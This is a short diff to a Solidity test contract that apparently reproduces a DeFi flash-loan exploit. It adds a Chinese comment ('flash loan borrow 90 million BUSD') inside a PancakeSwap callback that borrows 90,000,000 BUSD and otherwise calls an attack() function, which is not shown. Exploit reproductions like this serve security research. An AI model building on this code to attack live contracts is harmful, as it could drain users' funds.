@@ -141,8 +141,10 @@ contract ContractTest is DSTest {
     function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external{
 
         if(msg.sender == BUSDT_WBNB_Pair){
-
+        
+            // 闪电贷借9千万BUSD
             IpancakePair(BUSD_USDT_Pair).swap(0, 90000000 ether,address(this), '0x00');
+            
         }else{
             attack();
         }
